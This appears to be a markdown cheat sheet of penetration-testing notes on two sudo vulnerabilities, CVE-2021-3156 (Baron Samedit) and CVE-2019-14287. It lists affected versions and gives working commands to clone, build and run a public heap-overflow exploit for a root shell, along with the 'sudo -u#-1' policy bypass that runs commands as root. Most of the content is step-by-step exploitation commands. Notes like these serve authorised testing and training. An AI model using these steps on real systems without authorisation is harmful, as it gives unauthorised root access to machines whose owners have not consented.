## Sudo CVEs

### CVE-2021-3156 — Baron Samedit

A heap-based buffer overflow in `sudo` that allows any local user to gain a root shell without authentication. It affected a wide range of distributions before being patched in early 2021:

| Version | Distribution |
| ------- | ------------ |
| 1.8.31  | Ubuntu 20.04 |
| 1.8.27  | Debian 10    |
| 1.9.2   | Fedora 33    |

#### Check sudo version

```shell
sudo -V | head -n1
```

#### Exploit

```shell
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

Running the exploit without arguments lists all supported OS targets. Identify the current distribution:

```shell
cat /etc/lsb-release
```

Then run with the corresponding target ID:

```shell
./sudo-hax-me-a-sandwich 1
```

---

### CVE-2019-14287 — Sudo Policy Bypass

Affects all sudo versions **below 1.8.28**. If a user has permission to run any command as any user via `sudoers`, passing the UID `-1` causes sudo to resolve it as `0` (root) — bypassing the intended restriction entirely.

#### Prerequisite

The sudoers entry must allow running as any user (`ALL`):

```shell
sudo -l
# User cry0l1t3 may run the following commands:
#     (ALL) /usr/bin/id
```

#### Verify the user's UID

```shell
cat /etc/passwd | grep cry0l1t3
```

#### Exploit

```shell
sudo -u#-1 id
```

sudo misinterprets `-1` as UID `0`, executing the command as root despite the policy.

> 💡 This bypass only works when the sudoers rule specifies `(ALL)` — if it restricts to a specific user list (e.g. `(root)`), the `-1` trick does not apply.
